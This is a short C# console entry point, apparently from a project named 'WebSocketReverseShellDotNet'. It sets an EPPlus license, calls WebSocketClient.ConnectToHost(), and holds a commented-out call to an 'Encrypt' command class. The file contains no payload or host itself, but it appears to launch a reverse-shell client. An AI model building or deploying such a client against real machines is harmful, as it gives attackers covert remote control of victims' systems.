﻿// See https://aka.ms/new-console-template for more information
using OfficeOpenXml;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using WebSocketReverseShellDotNet.service.impl;
using System.Windows.Forms;
using WebSocketReverseShellDotNet.service.commands;

/*
Encrypt encrypt = new Encrypt();
encrypt.ExecuteCommand("");*/



ExcelPackage.LicenseContext = LicenseContext.NonCommercial;
WebSocketClient.ConnectToHost();

